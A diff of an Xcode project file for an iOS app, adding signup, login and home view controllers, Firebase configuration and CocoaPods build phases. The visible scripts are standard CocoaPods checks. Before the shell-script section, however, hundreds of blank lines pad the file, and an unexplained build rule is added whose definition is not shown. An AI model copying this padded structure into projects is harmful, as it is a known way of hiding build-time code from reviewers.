@@ -3,19 +3,34 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 50;
+	objectVersion = 51;
 	objects = {
 
 /* Begin PBXBuildFile section */
 		0D394F9826058883007A49E8 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394F9726058883007A49E8 /* AppDelegate.swift */; };
 		0D394F9A26058883007A49E8 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394F9926058883007A49E8 /* SceneDelegate.swift */; };
-		0D394F9C26058883007A49E8 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394F9B26058883007A49E8 /* ViewController.swift */; };
 		0D394F9F26058883007A49E8 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0D394F9D26058883007A49E8 /* Main.storyboard */; };
 		0D394FA226058884007A49E8 /* BlackcofferApplication.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 0D394FA026058883007A49E8 /* BlackcofferApplication.xcdatamodeld */; };
 		0D394FA426058887007A49E8 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 0D394FA326058887007A49E8 /* Assets.xcassets */; };
 		0D394FA726058887007A49E8 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0D394FA526058887007A49E8 /* LaunchScreen.storyboard */; };
 		0D394FB226058887007A49E8 /* BlackcofferApplicationTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394FB126058887007A49E8 /* BlackcofferApplicationTests.swift */; };
 		0D394FBD26058887007A49E8 /* BlackcofferApplicationUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394FBC26058887007A49E8 /* BlackcofferApplicationUITests.swift */; };
+		0D394FD42605D209007A49E8 /* WelcomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394FD32605D209007A49E8 /* WelcomeViewController.swift */; };
+		0D394FD92605FFBD007A49E8 /* SignUpViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394FD82605FFBD007A49E8 /* SignUpViewController.swift */; };
+		0D394FDE2605FFCD007A49E8 /* LogInViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D394FDD2605FFCD007A49E8 /* LogInViewController.swift */; };
+		0D3950202606DA30007A49E8 /* SecurityCheckViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D39501F2606DA30007A49E8 /* SecurityCheckViewController.swift */; };
+		0D39502F2606E379007A49E8 /* TagsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D39502E2606E379007A49E8 /* TagsViewController.swift */; };
+		0D3950372606E389007A49E8 /* TrendingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D3950362606E389007A49E8 /* TrendingViewController.swift */; };
+		0D39503C2606E394007A49E8 /* ExploreViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D39503B2606E394007A49E8 /* ExploreViewController.swift */; };
+		0D3950412606E3A1007A49E8 /* SavedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0D3950402606E3A1007A49E8 /* SavedViewController.swift */; };
+		0DAF6EB72608AF3300327EA2 /* HomeTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0DAF6EB62608AF3300327EA2 /* HomeTabBarController.swift */; };
+		0DAF6EEA2608BF8A00327EA2 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 0DAF6EE92608BF8A00327EA2 /* GoogleService-Info.plist */; };
+		0DAF6EF32608EE4D00327EA2 /* UIViewController+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0DAF6EF22608EE4D00327EA2 /* UIViewController+Extension.swift */; };
+		0DAF6F302608FCC800327EA2 /* String+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0DAF6F2F2608FCC800327EA2 /* String+Extension.swift */; };
+		0DAF6F38260915A700327EA2 /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 0DAF6F37260915A700327EA2 /* Home.storyboard */; };
+		7E0A1A3E8B57CF94A5843790 /* Pods_BlackcofferApplicationTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 0F8F82664FE2559AEC05853F /* Pods_BlackcofferApplicationTests.framework */; };
+		87EC4DC035C85BE3D060D4B4 /* Pods_BlackcofferApplication_BlackcofferApplicationUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 921B7A41F62D4AFED48FA498 /* Pods_BlackcofferApplication_BlackcofferApplicationUITests.framework */; };
+		F0629F56B4948FBF43723878 /* Pods_BlackcofferApplication.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = EC3D338C13079117ABF1F4CB /* Pods_BlackcofferApplication.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -39,7 +54,6 @@
 		0D394F9426058883007A49E8 /* BlackcofferApplication.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BlackcofferApplication.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		0D394F9726058883007A49E8 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		0D394F9926058883007A49E8 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
-		0D394F9B26058883007A49E8 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		0D394F9E26058883007A49E8 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		0D394FA126058883007A49E8 /* BlackcofferApplication.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = BlackcofferApplication.xcdatamodel; sourceTree = "<group>"; };
 		0D394FA326058887007A49E8 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -51,6 +65,28 @@
 		0D394FB826058887007A49E8 /* BlackcofferApplicationUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = BlackcofferApplicationUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		0D394FBC26058887007A49E8 /* BlackcofferApplicationUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BlackcofferApplicationUITests.swift; sourceTree = "<group>"; };
 		0D394FBE26058887007A49E8 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		0D394FD32605D209007A49E8 /* WelcomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WelcomeViewController.swift; sourceTree = "<group>"; };
+		0D394FD82605FFBD007A49E8 /* SignUpViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SignUpViewController.swift; sourceTree = "<group>"; };
+		0D394FDD2605FFCD007A49E8 /* LogInViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LogInViewController.swift; sourceTree = "<group>"; };
+		0D39501F2606DA30007A49E8 /* SecurityCheckViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SecurityCheckViewController.swift; sourceTree = "<group>"; };
+		0D39502E2606E379007A49E8 /* TagsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TagsViewController.swift; sourceTree = "<group>"; };
+		0D3950362606E389007A49E8 /* TrendingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TrendingViewController.swift; sourceTree = "<group>"; };
+		0D39503B2606E394007A49E8 /* ExploreViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ExploreViewController.swift; sourceTree = "<group>"; };
+		0D3950402606E3A1007A49E8 /* SavedViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SavedViewController.swift; sourceTree = "<group>"; };
+		0DAF6EB62608AF3300327EA2 /* HomeTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeTabBarController.swift; sourceTree = "<group>"; };
+		0DAF6EE92608BF8A00327EA2 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		0DAF6EF22608EE4D00327EA2 /* UIViewController+Extension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "UIViewController+Extension.swift"; sourceTree = "<group>"; };
+		0DAF6F2F2608FCC800327EA2 /* String+Extension.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "String+Extension.swift"; sourceTree = "<group>"; };
+		0DAF6F37260915A700327EA2 /* Home.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; path = Home.storyboard; sourceTree = "<group>"; };
+		0F8F82664FE2559AEC05853F /* Pods_BlackcofferApplicationTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BlackcofferApplicationTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		11F8D359A7D917B9B705D22C /* Pods-BlackcofferApplication-BlackcofferApplicationUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BlackcofferApplication-BlackcofferApplicationUITests.release.xcconfig"; path = "Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests.release.xcconfig"; sourceTree = "<group>"; };
+		22596797ABB87BD165D9668B /* Pods-BlackcofferApplication-BlackcofferApplicationUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BlackcofferApplication-BlackcofferApplicationUITests.debug.xcconfig"; path = "Target Support Files/Pods-BlackcofferApplication-BlackcofferApplicationUITests/Pods-BlackcofferApplication-BlackcofferApplicationUITests.debug.xcconfig"; sourceTree = "<group>"; };
+		8A0D1B60E83B897808E97E51 /* Pods-BlackcofferApplicationTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BlackcofferApplicationTests.debug.xcconfig"; path = "Target Support Files/Pods-BlackcofferApplicationTests/Pods-BlackcofferApplicationTests.debug.xcconfig"; sourceTree = "<group>"; };
+		921B7A41F62D4AFED48FA498 /* Pods_BlackcofferApplication_BlackcofferApplicationUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BlackcofferApplication_BlackcofferApplicationUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		B6E8E58D64F3904672885D93 /* Pods-BlackcofferApplicationTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BlackcofferApplicationTests.release.xcconfig"; path = "Target Support Files/Pods-BlackcofferApplicationTests/Pods-BlackcofferApplicationTests.release.xcconfig"; sourceTree = "<group>"; };
+		C635F728666C2DE89672178D /* Pods-BlackcofferApplication.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BlackcofferApplication.debug.xcconfig"; path = "Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication.debug.xcconfig"; sourceTree = "<group>"; };
+		C636189A49C6D29440585419 /* Pods-BlackcofferApplication.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BlackcofferApplication.release.xcconfig"; path = "Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication.release.xcconfig"; sourceTree = "<group>"; };
+		EC3D338C13079117ABF1F4CB /* Pods_BlackcofferApplication.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BlackcofferApplication.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -58,6 +94,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				F0629F56B4948FBF43723878 /* Pods_BlackcofferApplication.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -65,6 +102,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				7E0A1A3E8B57CF94A5843790 /* Pods_BlackcofferApplicationTests.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -72,6 +110,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				87EC4DC035C85BE3D060D4B4 /* Pods_BlackcofferApplication_BlackcofferApplicationUITests.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -85,6 +124,8 @@
 				0D394FB026058887007A49E8 /* BlackcofferApplicationTests */,
 				0D394FBB26058887007A49E8 /* BlackcofferApplicationUITests */,
 				0D394F9526058883007A49E8 /* Products */,
+				104A223CE3EB6C137B6166B7 /* Pods */,
+				9B4E049C185157ECC01D1B68 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -101,13 +142,12 @@
 		0D394F9626058883007A49E8 /* BlackcofferApplication */ = {
 			isa = PBXGroup;
 			children = (
-				0D394F9726058883007A49E8 /* AppDelegate.swift */,
-				0D394F9926058883007A49E8 /* SceneDelegate.swift */,
-				0D394F9B26058883007A49E8 /* ViewController.swift */,
-				0D394F9D26058883007A49E8 /* Main.storyboard */,
-				0D394FA326058887007A49E8 /* Assets.xcassets */,
-				0D394FA526058887007A49E8 /* LaunchScreen.storyboard */,
+				0DAF6EF12608EE4300327EA2 /* Extension */,
+				0D394FCF2605CB69007A49E8 /* Storyboards */,
+				0D394FCE2605CB5E007A49E8 /* Resources */,
+				0D394FCD2605CB4C007A49E8 /* ViewControllers */,
 				0D394FA826058887007A49E8 /* Info.plist */,
+				0DAF6EE92608BF8A00327EA2 /* GoogleService-Info.plist */,
 				0D394FA026058883007A49E8 /* BlackcofferApplication.xcdatamodeld */,
 			);
 			path = BlackcofferApplication;
@@ -131,6 +171,90 @@
 			path = BlackcofferApplicationUITests;
 			sourceTree = "<group>";
 		};
+		0D394FCD2605CB4C007A49E8 /* ViewControllers */ = {
+			isa = PBXGroup;
+			children = (
+				0D39502A2606E2C2007A49E8 /* Signup */,
+				0D3950292606E2A7007A49E8 /* Home */,
+			);
+			path = ViewControllers;
+			sourceTree = "<group>";
+		};
+		0D394FCE2605CB5E007A49E8 /* Resources */ = {
+			isa = PBXGroup;
+			children = (
+				0D394FA326058887007A49E8 /* Assets.xcassets */,
+				0D394F9726058883007A49E8 /* AppDelegate.swift */,
+				0D394F9926058883007A49E8 /* SceneDelegate.swift */,
+			);
+			path = Resources;
+			sourceTree = "<group>";
+		};
+		0D394FCF2605CB69007A49E8 /* Storyboards */ = {
+			isa = PBXGroup;
+			children = (
+				0DAF6F37260915A700327EA2 /* Home.storyboard */,
+				0D394F9D26058883007A49E8 /* Main.storyboard */,
+				0D394FA526058887007A49E8 /* LaunchScreen.storyboard */,
+			);
+			path = Storyboards;
+			sourceTree = "<group>";
+		};
+		0D3950292606E2A7007A49E8 /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				0D39502E2606E379007A49E8 /* TagsViewController.swift */,
+				0D3950362606E389007A49E8 /* TrendingViewController.swift */,
+				0D39503B2606E394007A49E8 /* ExploreViewController.swift */,
+				0D3950402606E3A1007A49E8 /* SavedViewController.swift */,
+				0DAF6EB62608AF3300327EA2 /* HomeTabBarController.swift */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
+		0D39502A2606E2C2007A49E8 /* Signup */ = {
+			isa = PBXGroup;
+			children = (
+				0D394FD32605D209007A49E8 /* WelcomeViewController.swift */,
+				0D394FD82605FFBD007A49E8 /* SignUpViewController.swift */,
+				0D394FDD2605FFCD007A49E8 /* LogInViewController.swift */,
+				0D39501F2606DA30007A49E8 /* SecurityCheckViewController.swift */,
+			);
+			path = Signup;
+			sourceTree = "<group>";
+		};
+		0DAF6EF12608EE4300327EA2 /* Extension */ = {
+			isa = PBXGroup;
+			children = (
+				0DAF6F2F2608FCC800327EA2 /* String+Extension.swift */,
+				0DAF6EF22608EE4D00327EA2 /* UIViewController+Extension.swift */,
+			);
+			path = Extension;
+			sourceTree = "<group>";
+		};
+		104A223CE3EB6C137B6166B7 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				C635F728666C2DE89672178D /* Pods-BlackcofferApplication.debug.xcconfig */,
+				C636189A49C6D29440585419 /* Pods-BlackcofferApplication.release.xcconfig */,
+				22596797ABB87BD165D9668B /* Pods-BlackcofferApplication-BlackcofferApplicationUITests.debug.xcconfig */,
+				11F8D359A7D917B9B705D22C /* Pods-BlackcofferApplication-BlackcofferApplicationUITests.release.xcconfig */,
+				8A0D1B60E83B897808E97E51 /* Pods-BlackcofferApplicationTests.debug.xcconfig */,
+				B6E8E58D64F3904672885D93 /* Pods-BlackcofferApplicationTests.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		9B4E049C185157ECC01D1B68 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				EC3D338C13079117ABF1F4CB /* Pods_BlackcofferApplication.framework */,
+				921B7A41F62D4AFED48FA498 /* Pods_BlackcofferApplication_BlackcofferApplicationUITests.framework */,
+				0F8F82664FE2559AEC05853F /* Pods_BlackcofferApplicationTests.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -138,11 +262,15 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0D394FC126058887007A49E8 /* Build configuration list for PBXNativeTarget "BlackcofferApplication" */;
 			buildPhases = (
+				432A1AFF387F0A2E476587CC /* [CP] Check Pods Manifest.lock */,
 				0D394F9026058883007A49E8 /* Sources */,
 				0D394F9126058883007A49E8 /* Frameworks */,
 				0D394F9226058883007A49E8 /* Resources */,
+				066236860051AD00387697A9 /* [CP] Embed Pods Frameworks */,
+				41271D28A985AF5F233534D7 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				4CB8ADC6FFEDCF7AFE6D902C /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -155,6 +283,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0D394FC426058887007A49E8 /* Build configuration list for PBXNativeTarget "BlackcofferApplicationTests" */;
 			buildPhases = (
+				E873E52C5DAB5D897D2D2208 /* [CP] Check Pods Manifest.lock */,
 				0D394FA926058887007A49E8 /* Sources */,
 				0D394FAA26058887007A49E8 /* Frameworks */,
 				0D394FAB26058887007A49E8 /* Resources */,
@@ -173,9 +302,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0D394FC726058887007A49E8 /* Build configuration list for PBXNativeTarget "BlackcofferApplicationUITests" */;
 			buildPhases = (
+				70BE61F73303A8588263C80A /* [CP] Check Pods Manifest.lock */,
 				0D394FB426058887007A49E8 /* Sources */,
 				0D394FB526058887007A49E8 /* Frameworks */,
 				0D394FB626058887007A49E8 /* Resources */,
+				906E91F3977FAB7B5B00D1B7 /* [CP] Embed Pods Frameworks */,
+				808F7DF190467A34090918C1 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
 			);
@@ -235,7 +367,9 @@
 			buildActionMask = 2147483647;
 			files = (
 				0D394FA726058887007A49E8 /* LaunchScreen.storyboard in Resources */,
+				0DAF6F38260915A700327EA2 /* Home.storyboard in Resources */,
 				0D394FA426058887007A49E8 /* Assets.xcassets in Resources */,
+				0DAF6EEA2608BF8A00327EA2 /* GoogleService-Info.plist in Resources */,
 				0D394F9F26058883007A49E8 /* Main.storyboard in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -256,15 +390,1310 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+		066236860051AD00387697A9 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		41271D28A985AF5F233534D7 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BlackcofferApplication/Pods-BlackcofferApplication-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		432A1AFF387F0A2E476587CC /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-BlackcofferApplication-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		70BE61F73303A8588263C80A /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-BlackcofferApplication-BlackcofferApplicationUITests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
